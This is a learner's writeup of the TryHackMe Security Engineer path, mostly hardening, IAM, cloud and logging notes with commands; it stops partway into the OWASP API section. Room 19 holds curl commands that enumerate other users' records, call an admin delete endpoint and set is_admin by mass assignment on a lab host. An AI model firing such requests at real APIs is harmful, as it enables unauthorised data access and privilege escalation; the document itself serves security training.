# TryHackMe — Security Engineer Path Writeup

**Platform:** TryHackMe  
**Path:** [Security Engineer](https://tryhackme.com/path/outline/security-engineer-training)  
**Difficulty:** Easy  
**Status:** ✅ Completed  
**Profile:** [gresium](https://tryhackme.com/p/gresium)  
**Date Completed:** 30 april 2026 
**Total Rooms:** 33 across 5 sections  
**Estimated Time:** ~64h  

---

## Summary

The Security Engineer path is the defensive counterpart to the Jr Penetration Tester path. Where pentesting teaches you to break systems, security engineering teaches you to build and harden them. The path covers the full scope of a security engineer's role — from IAM and cryptography, through network and system hardening, into software security (SSDLC, SAST, DAST, DevSecOps), and finally incident management. It is the most complete defensive path on TryHackMe and is directly relevant to real-world infrastructure roles, cloud security, and security architecture.

---

---

## Section 1 — Introduction to Security Engineering

> Goal: Understand the security engineer role, core security principles, cryptography, and identity management.

---

### Room 1 — Security Engineer Intro
🔗 https://tryhackme.com/room/securityengineerintro

**Key Concepts:**
- Security Engineer: designs secure systems, minimises risk, owns the organisation's security posture
- Responsibilities: vulnerability monitoring and patching, compliance management, architecture design, policy development, incident support
- SE vs pentester vs SOC analyst: engineer builds and maintains, pentester attacks to find gaps, SOC monitors and responds
- Compliance frameworks worked with: PCI-DSS, HIPAA, SOC2, ISO 27001, NIST 800-53

**What I did:**
Reviewed the full scope of the security engineer role and how it intersects with other technical and business teams. Mapped each path section to a real-world SE responsibility: hardening (Section 3), software security (Section 4), incident response (Section 5).

**Takeaways:**
Security engineers are generalists with depth — they must understand attackers (to design effective defences), developers (to review code), and the business (to prioritise risk). Offensive knowledge from Jr Pen Tester directly informs defensive engineering — you cannot harden a system you don't understand how to attack.

---

### Room 2 — Security Principles
🔗 https://tryhackme.com/room/securityprinciples

**Key Concepts:**
- CIA Triad: Confidentiality, Integrity, Availability — the three core security properties
- DAD Triad: Disclosure, Alteration, Destruction — the three attacks on CIA
- Bell-LaPadula: confidentiality model — "no read up, no write down" — used in classified environments
- Biba: integrity model — "no write up, no read down" — prevents lower-trust subjects corrupting higher-trust data
- Clark-Wilson: integrity via well-formed transactions and separation of duties — used in financial systems
- Defence in Depth: multiple independent control layers — attacker must bypass all of them
- Zero Trust: "never trust, always verify" — no implicit trust based on network location
- Least Privilege: minimum access needed for the function — applied to users, services, and processes
- STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege

**What I did:**
Applied CIA to real attack scenarios — ransomware encrypting files (Availability), exfiltrated database (Confidentiality), tampered financial records (Integrity). Used STRIDE to threat model a web application — identified all six categories and mapped each to a specific mitigation control.

**Takeaways:**
Security principles are the professional vocabulary that lets you communicate risk precisely. "This enables Elevation of Privilege via Spoofing, violating Integrity" is far more useful to a developer than "this is a bad issue." STRIDE is fast to apply and systematic — it should be part of every design review.

---

### Room 3 — Introduction to Cryptography
🔗 https://tryhackme.com/room/cryptographyintro

**Key Concepts:**
- Symmetric encryption: same key for encrypt/decrypt — AES-256-GCM is the standard (fast, provides authentication)
- Asymmetric encryption: public key encrypts/verifies, private key decrypts/signs — RSA-4096 or ECC P-256
- Diffie-Hellman key exchange: two parties agree on a shared secret over a public channel without transmitting it
- Hashing: one-way, fixed-length digest — MD5/SHA-1 broken, SHA-256 for integrity, bcrypt/Argon2 for passwords
- PKI: Certificate Authorities, certificates, trust chains — foundation of HTTPS
- TLS 1.3: asymmetric for key exchange, AES-GCM for session encryption, PFS built in
- PGP/GPG: asymmetric encryption and signing for files and email

**What I did:**
Generated symmetric and asymmetric key pairs, encrypted/decrypted data, created and verified signatures. Traced the TLS 1.3 handshake step-by-step. Generated a GPG key pair and encrypted a file for a recipient using their public key.

```bash
# AES-256 encryption/decryption
openssl enc -aes-256-cbc -in plain.txt -out cipher.bin -k "key" -pbkdf2
openssl enc -d -aes-256-cbc -in cipher.bin -out out.txt -k "key" -pbkdf2

# RSA key generation
openssl genrsa -out private.key 4096
openssl rsa -in private.key -pubout -out public.key

# Hashing
echo -n "password123" | sha256sum
sha256sum file.iso    # verify download integrity

# GPG key pair and encryption
gpg --full-gen-key
gpg --export --armor user@thm.local > pub.key
gpg --encrypt --recipient user@thm.local secret.txt
gpg --sign document.txt && gpg --verify document.txt.sig
```

**Takeaways:**
Algorithm selection is a security engineering decision — AES-256-GCM for bulk encryption (also provides integrity), RSA-4096 or ECC for key exchange, SHA-256 for file integrity, Argon2 for password hashing. MD5 for anything security-relevant is a critical finding in a design review — collisions are trivially generatable.

---

### Room 4 — Identity and Access Management
🔗 https://tryhackme.com/room/iamessentials

**Key Concepts:**
- IAM: controls who can access what, under what conditions
- Authentication factors: something you know, have, are — MFA combines two or more
- SSO: authenticate once, access multiple services — SAML 2.0, OAuth 2.0, OpenID Connect
- RBAC: permissions assigned to roles, roles assigned to users — more manageable than per-user ACLs
- ABAC: access decisions based on attributes (department, location, time of day, device trust level)
- PAM: privileged access management — just-in-time elevation, session recording, credential vaulting
- Privilege creep: users accumulate permissions across role changes without revocation — most common IAM failure
- Zero Trust identity: every access request verified regardless of network location

**What I did:**
Configured RBAC policies — defined roles, mapped permissions to roles, assigned users to roles. Reviewed OAuth 2.0 authorisation code flow and SAML 2.0 assertion structure. Assessed an IAM configuration and identified privilege creep — multiple accounts with Administrator access from previous roles that no longer required it. Reviewed PAM just-in-time access concepts.

**Takeaways:**
Privilege creep silently kills least privilege — without periodic access reviews, every employee accumulates far more access than their current role requires. PAM with just-in-time elevation (grant admin rights for a specific task, expire after completion) dramatically reduces the attack surface of privileged accounts. IAM misconfigurations are the root cause of most cloud breaches — a compromised identity with AdministratorAccess can destroy an entire cloud environment.

---

---

## Section 2 — Threats and Risks

> Goal: Governance frameworks, threat modelling, risk management, and vulnerability prioritisation.

---

### Room 5 — Governance & Regulation
🔗 https://tryhackme.com/room/cybergovernanceregulation

**Key Concepts:**
- Governance: policies and frameworks guiding security decisions — NIST CSF (Identify, Protect, Detect, Respond, Recover), ISO 27001, NIST 800-53
- GDPR: EU regulation — 72-hour breach notification for personal data, data minimisation, right to erasure
- PCI-DSS: 12 requirements for cardholder data handling — QSA assessment required for large merchants
- HIPAA: US law protecting health information — administrative, physical, and technical safeguards
- GRC: Governance, Risk, Compliance — integrated programme managing all three

**What I did:**
Mapped security controls to NIST CSF categories. Reviewed a GDPR breach scenario — assessed 72-hour notification window requirements and which data types triggered mandatory reporting. Matched PCI-DSS requirements 1–12 to technical implementations.

**Takeaways:**
Compliance ≠ security — an organisation can pass a PCI-DSS audit and be breached the next day. Compliance defines the minimum baseline; risk management determines how far above the floor to go. Understanding regulatory timelines is essential for IR planning — GDPR 72h, SEC 4 business days, NIS2 72h.

---

### Room 6 — Threat Modelling
🔗 https://tryhackme.com/room/threatmodelling

**Key Concepts:**
- Threat modelling: identify threats during design — orders of magnitude cheaper than fixing in production
- STRIDE: applied per component and data flow — Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege
- PASTA: 7-stage risk-centric methodology — aligns threat analysis with business objectives
- DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability — numerical risk scoring
- Attack trees: hierarchical — root node is the attacker's goal, leaf nodes are attack methods
- DFDs: map data movement between components — trust boundaries are where threats concentrate
- Trust boundaries: transitions between privilege levels or trust zones — every crossing is a potential attack surface

**What I did:**
Drew a Level 0 and Level 1 DFD for a web application, identified all trust boundaries, applied STRIDE systematically to every data flow and process. Built an attack tree for "attacker gains admin access" — branches covered SQL injection, credential brute-force, session hijacking, phishing, and insider threat. Scored each threat with DREAD and produced a prioritised mitigation backlog.

**Takeaways:**
A trust boundary violation caught in a DFD review takes 30 minutes to fix in design — the same issue found by a pentester takes weeks of developer time and a potential breach window. Every security engineer should be able to run a STRIDE threat model in a design review meeting without preparation.

---

### Room 7 — Risk Management
🔗 https://tryhackme.com/room/riskmanagement

**Key Concepts:**
- Risk = Likelihood × Impact — qualitative (H/M/L) or quantitative (financial values)
- Risk lifecycle: Identify → Assess → Treat → Monitor — continuous cycle
- Treatment options: Accept / Mitigate / Transfer / Avoid
- Risk register: tracks all risks with asset, threat, vulnerability, scores, treatment, owner, review date
- ALE (Annual Loss Expectancy) = ARO × SLE — quantitative justification for control investment
  - ARO: Annual Rate of Occurrence
  - SLE: Single Loss Expectancy (financial cost per event)

**What I did:**
Built a risk register for a fictional organisation. Calculated qualitative risk scores across asset categories. Applied ALE — ransomware SLE (£500k recovery + downtime + legal) × ARO (0.3/year) = £150k/year ALE — justified £40k/year EDR + backup solution clearly. Translated all findings into business-impact language for a board-level risk presentation.

**Takeaways:**
ALE is what gets security funded — finance doesn't respond to "critical vulnerability," they respond to "expected annual loss of £150,000 versus £40,000 control cost." The risk register with named owners and review dates is the accountability document — risks without owners drift indefinitely.

---

### Room 8 — Vulnerability Management
🔗 https://tryhackme.com/room/vulnerabilitymanagementkj

**Key Concepts:**
- Lifecycle: Discover → Prioritise → Remediate → Verify → Report — continuous
- Asset inventory: foundation of vulnerability management — you cannot manage what you do not know exists
- Scanning: Nessus, OpenVAS, Qualys — credentialed scans are significantly more accurate than unauthenticated
- CVSS: Base (inherent), Temporal (exploit availability), Environmental (asset criticality) — always apply Environmental before prioritising
- Patch SLAs: Critical 24–72h, High 7 days, Medium 30 days, Low next cycle
- Virtual patching: WAF/IPS rules blocking exploitation while patch is tested
- EPSS: probability-based metric predicting exploitation likelihood in the wild — supplements CVSS

**What I did:**
Ran a credentialed scan and triaged 47 findings. Applied environmental scoring — downgraded a CVSS 9.8 on an isolated internal system and upgraded a CVSS 6.5 on an internet-facing login service. Distinguished 8 false positives via manual verification. Produced a prioritised remediation report with SLA deadlines.

**Takeaways:**
CVSS 9.8 on an air-gapped test server with no public exploit is lower priority than CVSS 7.5 on an internet-facing auth endpoint being actively exploited in the wild. EPSS adds the exploitation probability dimension CVSS lacks. False positive management is critical — phantom vulnerabilities reported to developers destroy trust in the vulnerability management programme.

---

---

## Section 3 — Network and System Security

> Goal: Design secure architectures and harden Linux, Windows, Active Directory, and network devices.

---

### Room 9 — Secure Network Architecture
🔗 https://tryhackme.com/room/introtosecurityarchitecture

**Key Concepts:**
- Network segmentation: isolates zones — limits blast radius from a single compromised host
- DMZ: between internet and internal network — hosts public-facing services (web, mail, VPN gateway)
- Network zones (least to most trusted): Internet → DMZ → Internal Corporate → Restricted (DB, AD, OT)
- Firewall placement: perimeter (internet edge), internal (zone boundaries), host-based (each endpoint)
- Zero Trust Network Architecture: per-application, identity-verified access — replaces implicit VPN trust
- Bastion/jump servers: hardened, monitored entry point for managing restricted zone systems
- IDS/IPS placement: at zone boundary chokepoints — inline (IPS can block), out-of-band (IDS monitors)
- NAC: verify device security posture before granting network access — 802.1X for wired/wireless

**What I did:**
Designed a network architecture for a fictional e-commerce organisation — placed web and mail in the DMZ, application servers in an internal tier, databases and domain controllers in a restricted zone, and HR workstations in a separate VLAN. Positioned perimeter and internal firewalls, IDS sensors at each boundary, and a jump server for database administrator access. Justified each design decision in terms of lateral movement prevention.

**Takeaways:**
A flat network means one compromised workstation has direct connectivity to every server and database. Segmentation means the same compromise can only reach the workstation's own VLAN and explicitly allowed services. Microsegmentation (per-workload firewall rules inside the network) is the modern evolution — it applies Zero Trust principles to east-west traffic, not just north-south.

---

### Room 10 — Linux System Hardening
🔗 https://tryhackme.com/room/linuxsystemhardening

**Key Concepts:**
- CIS Benchmarks: scored hardening guides — enterprise baseline for every major OS version
- Account management: disable root SSH, use sudo, enforce password complexity and expiry
- SSH hardening: key-based auth only, disable password auth, restrict AllowUsers
- Services: disable everything not required — `systemctl disable` — smaller attack surface
- UFW/iptables: default deny inbound, allow only required ports
- `unattended-upgrades`: automatic security patch application
- `auditd`: kernel-level audit daemon — logs privilege escalation, sensitive file access, command execution
- AppArmor/SELinux: Mandatory Access Control — confines what processes can do post-compromise

**What I did:**
Hardened Ubuntu 22.04 against the CIS Level 1 benchmark — disabled root SSH, enabled key-based auth and disabled password auth, configured UFW, removed unnecessary packages, enabled auto security updates, deployed auditd with rules for passwd/shadow/sudoers/root commands, and verified AppArmor profiles.

```bash
# SSH hardening
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
echo "AllowUsers deployuser adminuser" >> /etc/ssh/sshd_config
systemctl restart sshd

# Firewall
ufw default deny incoming && ufw default allow outgoing
ufw allow 22/tcp && ufw allow 443/tcp
ufw enable && ufw status verbose

# Auto security updates
apt install unattended-upgrades -y
dpkg-reconfigure -plow unattended-upgrades

# auditd rules
apt install auditd -y && systemctl enable --now auditd
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p rwa -k shadow_access
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_commands
ausearch -k passwd_changes && aureport --summary

# SUID audit
find / -perm -4000 -type f 2>/dev/null | sort
```

**Takeaways:**
Disabling root SSH eliminates the most targeted account from brute-force campaigns. Key-based auth removes the password attack surface entirely. `auditd` provides the forensic trail for post-incident investigation — without it you know something happened but not what. AppArmor confines compromised processes to their expected behaviour — a compromised nginx cannot read `/etc/shadow` even with exploit code.

---

### Room 11 — Microsoft Windows Hardening
🔗 https://tryhackme.com/room/microsoftwindowshardening

**Key Concepts:**
- Windows Security Baseline: Microsoft's recommended settings — hundreds of GPO settings covering every attack surface
- Disable SMBv1: deprecated since 2014, exploited by EternalBlue (MS17-010), weaponised by WannaCry — one command fix
- PowerShell logging: ScriptBlock Logging (Event ID 4104), Module Logging, Transcript Logging — makes PS-based attacks visible
- AppLocker/WDAC: application whitelisting — prevents unsigned and unauthorised executables including renamed LOLBins
- BitLocker: full volume encryption — protects data if device is physically stolen
- Credential Guard: isolates LSASS in a virtualised process — Mimikatz and Pass-the-Hash become impossible
- LAPS: randomises local admin password per machine — eliminates shared-password lateral movement

**What I did:**
Applied Windows 11 security baseline via GPO. Disabled SMBv1. Enabled all PowerShell logging categories. Configured AppLocker rules. Verified BitLocker and Credential Guard status. Deployed LAPS and confirmed unique passwords assigned to all managed machines.

```powershell
# Disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Get-SmbServerConfiguration | Select EnableSMB1Protocol

# Enable PowerShell ScriptBlock logging
New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 1

# Audit admin membership
Get-LocalGroupMember -Group "Administrators"
Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName

# BitLocker and Credential Guard
Get-BitLockerVolume | Select MountPoint,VolumeStatus,EncryptionPercentage
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select SecurityServicesRunning

# LAPS
Get-ADComputer -Identity "WS01" -Properties "ms-Mcs-AdmPwd" | Select "ms-Mcs-AdmPwd"
```

**Takeaways:**
Disabling SMBv1 is a single-command fix that eliminates the entire EternalBlue attack surface — no reason not to apply immediately. PowerShell ScriptBlock logging (Event ID 4104) is the highest-value Windows detection improvement — every script block executed is logged, making PowerShell C2, payload download, and credential harvesting visible in Event Viewer. Credential Guard makes Pass-the-Hash technically impossible by keeping LSASS credentials in an isolated virtualised environment.

---

### Room 12 — Active Directory Hardening
🔗 https://tryhackme.com/room/activedirectoryhardening

**Key Concepts:**
- AD attack surface: Kerberoasting (SPN account hash cracking), AS-REP Roasting (no pre-auth accounts), Pass-the-Hash, DCSync, BloodHound enumeration
- Tier model: Tier 0 (DCs, Domain Admins), Tier 1 (servers), Tier 2 (workstations) — credentials must never cross tier boundaries
- Protected Users security group: prevents NTLM auth, credential caching, delegation — makes members PTH and Kerberoasting resistant
- Kerberoasting defence: service accounts use 25+ character random passwords or Group Managed Service Accounts (gMSA — auto-rotated)
- AS-REP Roasting defence: require Kerberos pre-authentication on all accounts
- LAPS: unique randomised local admin password per machine — eliminates shared-password lateral movement
- Privileged Access Workstations (PAWs): dedicated hardened devices for Tier 0/1 admin operations

**What I did:**
Audited an AD environment — found 3 accounts with pre-auth disabled (AS-REP Roastable), 5 service accounts with SPNs and weak passwords (Kerberoastable), 2 Domain Admin accounts with workstation logon history. Remediated: enabled pre-auth on all accounts, migrated service accounts to gMSA, restricted DA logons via GPO to DCs only, deployed LAPS, added service accounts to Protected Users.

```powershell
# Find AS-REP Roastable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
  Select Name,SamAccountName

# Find Kerberoastable accounts (have SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select Name,SamAccountName,ServicePrincipalName

# Accounts with no password expiry
Get-ADUser -Filter {PasswordNeverExpires -eq $true -and Enabled -eq $true} |
  Select Name,SamAccountName

# Stale accounts (no logon 90+ days)
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter {LastLogonDate -lt $cutoff -and Enabled -eq $true} -Properties LastLogonDate |
  Select Name,SamAccountName,LastLogonDate

# Add to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "svc_sql","svc_web","svc_backup"

# Verify LAPS deployment
Get-ADComputer -Filter * -Properties "ms-Mcs-AdmPwd" |
  Where {$_."ms-Mcs-AdmPwd" -ne $null} | Select Name,"ms-Mcs-AdmPwd"
```

**Takeaways:**
LAPS is the most effective control against lateral movement in Windows environments — shared local admin passwords are the most common path from workstation compromise to domain compromise. Protected Users membership disables NTLM authentication for the account entirely — no NTLM = no Pass-the-Hash, no Responder captures, no relay attacks. The tier model prevents Domain Admins' credentials being cached on workstations where they can be stolen.

---

### Room 13 — Network Device Hardening
🔗 https://tryhackme.com/room/networkdevicehardening

**Key Concepts:**
- Network devices are critical infrastructure — a compromised router gives privileged position on every connected segment
- Default credentials: change immediately — factory passwords are published for every vendor device
- Management plane: restrict to management VLAN, SSH v2 only (no Telnet), ACL limiting source IPs
- Control plane: routing protocol authentication — OSPF MD5, BGP session auth
- SNMP: SNMPv3 only (encrypted, authenticated) — never v1/v2c (community strings are cleartext)
- Unused features: disable CDP/LLDP where unneeded, unused ports, unused management protocols (HTTP, TFTP)
- Syslog: forward all logs to centralised server immediately — prevents local log deletion
- NTP: synchronise all clocks — essential for log correlation

**What I did:**
Hardened a Cisco router against CIS Benchmarks for IOS — changed default credentials, disabled Telnet and enabled SSH v2, configured ACLs restricting management to management VLAN, deployed SNMPv3, configured NTP, forwarded logs to centralised syslog server.

```
! Secure management
username admin privilege 15 secret Str0ngP@ss!
service password-encryption

! SSH v2 only — disable Telnet
ip ssh version 2
ip ssh time-out 60
line vty 0 4
  transport input ssh
  login local
  exec-timeout 10 0

! Restrict management access
access-list 10 permit 10.10.10.0 0.0.0.255
access-list 10 deny any log
line vty 0 4
  access-class 10 in

! Disable unnecessary services
no service finger && no ip http server && no cdp run
no snmp-server community public
no snmp-server community private

! SNMPv3
snmp-server group SECGROUP v3 priv
snmp-server user secadmin SECGROUP v3 auth sha AuthPass priv aes 128 PrivPass

! NTP and syslog
ntp server 10.10.10.5
logging host 10.10.10.50
logging trap informational
service timestamps log datetime msec
```

**Takeaways:**
Network device hardening is frequently overlooked — organisations focus on endpoint security but leave routers and switches with factory passwords and Telnet enabled. A compromised core switch lets an attacker intercept all traffic, redirect routes, and pivot anywhere. Checking default credentials on network devices is a standard first step in internal pentests — the results are consistently surprising.

---

### Room 14 — Network Security Protocols
🔗 https://tryhackme.com/room/networksecurityprotocols

**Key Concepts:**
- Protocol replacement: Telnet → SSH, HTTP → HTTPS, FTP → SFTP/FTPS, SNMPv1/v2c → SNMPv3
- TLS hardening: disable TLS 1.0/1.1, require TLS 1.2 minimum (prefer 1.3), disable RC4/3DES/export ciphers
- Strong ciphers: `ECDHE-ECDSA-AES256-GCM-SHA384` — ECDHE provides perfect forward secrecy
- Security headers: HSTS, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options
- DNSSEC: signs DNS records — prevents cache poisoning and spoofing
- 802.1X: port-based NAC — authenticate before network access
- WPA3: current Wi-Fi standard — SAE replaces PSK, resists offline dictionary attacks

**What I did:**
Audited a web server's TLS configuration with `testssl.sh` — found TLS 1.0 enabled, RC4 offered, no HSTS header. Hardened Nginx to disable weak protocols, restrict to strong cipher suites, and add all required security headers.

```bash
# Audit TLS
testssl.sh https://target.thm
nmap --script ssl-enum-ciphers -p 443 target.thm

# Nginx TLS hardening
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;
```

**Takeaways:**
`testssl.sh` gives a comprehensive TLS audit in seconds — run it against every HTTPS endpoint. TLS 1.0 is still enabled on many servers for "compatibility" — disable it; all modern browsers support TLS 1.2+. HSTS prevents SSL stripping attacks — the `preload` directive adds the domain to browser built-in HSTS lists for maximum protection.

---

### Room 15 — Virtualization and Containers
🔗 https://tryhackme.com/room/virtualizationandcontainers

**Key Concepts:**
- VM isolation: hypervisor separates VMs — hypervisor escape is rare but critical
- Container isolation: share the host kernel via namespaces/cgroups — weaker isolation than VMs
- Docker security: non-root user, read-only filesystem, drop all capabilities then add only required
- Docker socket: `/var/run/docker.sock` mounted into a container = root on the host — critical misconfiguration
- Image scanning: Trivy, Snyk — detect CVEs in base images before deployment
- Kubernetes: RBAC, Network Policies, Pod Security Standards, Secrets encryption at rest

**What I did:**
Built a hardened multi-stage Dockerfile — distroless base, non-root user, read-only filesystem, dropped all capabilities. Scanned image with Trivy — found 3 high CVEs in base packages, rebuilt with updated base. Identified a deployment with Docker socket mounted — demonstrated host root access from inside the container.

```dockerfile
FROM python:3.11-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

FROM gcr.io/distroless/python3-debian12
COPY --from=builder /root/.local /home/appuser/.local
COPY --from=builder /app /app
USER 1000:1000
WORKDIR /app
COPY --chown=1000:1000 src/ .
EXPOSE 8080
ENTRYPOINT ["python", "app.py"]
```

```bash
# Scan image for CVEs
trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest

# Run with security constraints
docker run --user 1000:1000 --read-only --cap-drop ALL \
  --cap-add NET_BIND_SERVICE --security-opt no-new-privileges myapp:latest

# Check for Docker socket mount (critical finding)
docker inspect <container_id> | grep -A2 "Mounts"
```

**Takeaways:**
The Docker socket is the most dangerous mount — a container with `/var/run/docker.sock` can escape to full host root access and pivot to any other container on the node. Integrate Trivy into CI/CD with `--exit-code 1` — treat critical CVEs as build failures. Distroless images have no shell, no package manager, and minimal attack surface — attacker gets code execution but has almost no tools to work with.

---

### Room 16 — Intro to Cloud Security
🔗 https://tryhackme.com/room/introductiontocloudshardening

**Key Concepts:**
- Shared Responsibility Model: cloud provider secures infrastructure, customer secures what they deploy — the boundary is where breaches happen
- IAM least privilege: avoid AdministratorAccess attached to EC2 roles — use specific permission sets only
- S3/Blob misconfiguration: public buckets with sensitive data — one of the most prevalent cloud vulnerabilities
- IMDSv1 vs IMDSv2: IMDSv1 is accessible to any SSRF; IMDSv2 requires a session token header — enforce IMDSv2 on all instances
- CloudTrail / Azure Activity Log: API-level audit logging — captures every action in the account
- Secrets management: AWS Secrets Manager, Azure Key Vault — never hardcode credentials in code or environment variables
- CSPM: Prowler, ScoutSuite — continuously audit cloud configuration against best practice

**What I did:**
Audited an AWS environment with Prowler — found 3 public S3 buckets containing backups, 2 EC2 instances with AdministratorAccess roles, IMDSv1 on all instances, no CloudTrail in 2 regions, and security groups with `0.0.0.0/0` on port 22. Remediated all findings.

```bash
# Audit with Prowler
pip install prowler && prowler aws --services s3 iam ec2 cloudtrail

# Block S3 public access
aws s3api put-public-access-block --bucket mybucket \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enforce IMDSv2 (blocks SSRF to metadata)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxxxxxxxxxx \
  --http-tokens required --http-endpoint enabled

# Find overly permissive security groups
aws ec2 describe-security-groups \
  --query 'SecurityGroups[?contains(IpPermissions[].IpRanges[].CidrIp, `0.0.0.0/0`)].GroupId'

# Enable CloudTrail all regions
aws cloudtrail create-trail --name audit-trail --s3-bucket-name audit-logs --is-multi-region-trail
aws cloudtrail start-logging --name audit-trail
```

**Takeaways:**
Public S3 buckets have caused some of the largest data breaches on record — Capital One, GoDaddy, and dozens of others. The default should be block all public access. IMDSv2 is a single API call that eliminates SSRF exploitation of the cloud metadata service — enforce it on every EC2 instance at account level. CSPM tools catch configuration drift continuously; point-in-time audits miss changes made after the audit date.

---

### Room 17 — Auditing and Monitoring
🔗 https://tryhackme.com/room/auditingandmonitoringse

**Key Concepts:**
- Security audit: systematic review of controls against a standard — produces findings, risk ratings, remediation recommendations
- Continuous monitoring: automated, ongoing observation — contrast with point-in-time audits
- SIEM: aggregates and normalises logs, applies correlation rules — core detection platform
- Alert fatigue: excessive false positives → analysts ignore alerts → real attacks missed — tuning is continuous
- MTTD/MTTR: Mean Time to Detect / Mean Time to Respond — KPIs for security operations maturity
- Compliance auditing: evidence collection demonstrating controls are effective — logs, screenshots, config exports
- Change management: track all configuration changes — unauthorised changes are security indicators

**What I did:**
Analysed logs from a simulated intrusion across four sources — correlated: failed SSH attempts in `auth.log` (brute force phase), successful login from same IP (brute force success), `sudo su -` in auditd (privilege escalation), new cron job added (persistence), and outbound connection on non-standard port in firewall logs (C2). Built a detection rule encoding this pattern.

```bash
# Brute force detection
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Successful login after failures
grep "Accepted password" /var/log/auth.log | awk '{print $9,$11}' | sort

# Root escalation
grep "sudo" /var/log/auth.log | grep "COMMAND"
ausearch -k root_commands --start today

# New cron jobs (persistence)
grep "CRON" /var/log/syslog | tail -50

# C2 outbound connection detection
ss -tulnp | grep ESTABLISHED
```

**Takeaways:**
Effective monitoring requires knowing what normal looks like — authentication volume, process execution patterns, and network traffic baselines make anomalies visible. The intrusion timeline reconstruction is what enables full scope determination after an incident — without adequate logging you know something happened but not what. Log integrity is as important as log completeness — logs deletable by an attacker are not security logs.

---

---

## Section 4 — Software Security

> Goal: Secure software development lifecycle, code analysis, DevSecOps, and application vulnerability management.

---

### Room 18 — OWASP Top 10 - 2021
🔗 https://tryhackme.com/room/owasptop102021

**Key Concepts:**
- OWASP Top 10 (2021):
  1. **A01 Broken Access Control** — IDOR, privilege escalation, missing function-level auth (most prevalent)
  2. **A02 Cryptographic Failures** — plaintext data, weak algorithms, missing encryption
  3. **A03 Injection** — SQLi, command injection, template injection, LDAP injection
  4. **A04 Insecure Design** — architectural flaws requiring redesign — not patchable
  5. **A05 Security Misconfiguration** — defaults, verbose errors, missing security headers
  6. **A06 Vulnerable and Outdated Components** — libraries with known CVEs in production
  7. **A07 Identification and Authentication Failures** — weak sessions, no MFA, credential stuffing
  8. **A08 Software and Data Integrity Failures** — insecure deserialization, CI/CD compromise, unsigned updates
  9. **A09 Security Logging Failures** — insufficient logging, no alerting, slow detection
  10. **A10 SSRF** — server fetches attacker-specified URLs, accessing internal services

**What I did:**
Exploited examples of each category in a vulnerable lab application — IDOR for A01, SQL injection for A03, default credentials for A05, predictable session tokens for A07, SSRF for A10. Mapped each finding to its root cause and the developer-facing remediation.

**Takeaways:**
A01 being most prevalent reflects a fundamental challenge — every API endpoint, every data object, every function needs its own server-side authorisation check. Client-side access control (hiding buttons) is not access control. A08 (Integrity Failures) is increasingly critical as supply chain attacks target CI/CD pipelines — a compromised build server injects backdoors into every deployment.

---

### Room 19 — OWASP API Security Top 10 - 1
🔗 https://tryhackme.com/room/owaspapisecuritytop105w

**Key Concepts:**
- APIs have a distinct attack surface from traditional web apps
- **API1 BOLA**: change object IDs in API calls to access other users' data — most critical API risk
- **API2 Broken Authentication**: weak tokens, no rate limiting, long-lived tokens
- **API3 Broken Object Property Level Auth**: excessive data exposure (API returns too much), mass assignment (API accepts too much)
- **API4 Unrestricted Resource Consumption**: no rate limiting → DoS, abuse, cost amplification
- **API5 Broken Function Level Auth**: regular users calling admin-only endpoints

**What I did:**
Exploited BOLA by iterating user_id values 1–100. Found Broken Function Level Auth via `DELETE /api/v1/admin/users/{id}` with a regular user token. Demonstrated mass assignment — `POST /api/v1/user` accepted `"is_admin": true` that the UI never sent.

```bash
# BOLA
for i in {1..20}; do
  curl -s -H "Authorization: Bearer mytoken" http://target.thm/api/v1/users/$i | jq '.username,.email'
done

# Broken Function Level Auth
curl -X DELETE -H "Authorization: Bearer usertoken" http://target.thm/api/v1/admin/users/5

# Mass assignment
curl -X POST -H "Authorization: Bearer mytoken" \
  -d '{"username":"gresium","is_admin":true}' http://target.thm/api/v1/users/register
```

**Takeaways:**
BOLA is the most common and impactful API vulnerability — endemic in REST APIs using numeric IDs. APIs frequently return far more data than the app displays — always inspect the raw API response, not just the UI rendering. Mass assignment allows attackers to set properties the server never intended to accept from clients.

---

### Room 20 — OWASP API Security Top 10 - 2
🔗 https://tryhackme.com/room/owaspapisecuritytop10part2

**Key Concepts:**
- **API6 Unrestricted Business Flows**: abusing API logic at scale — bulk voucher redemption, automated purchasing
- **API7 SSRF**: API fetches user-supplied URLs — access internal services and cloud metadata
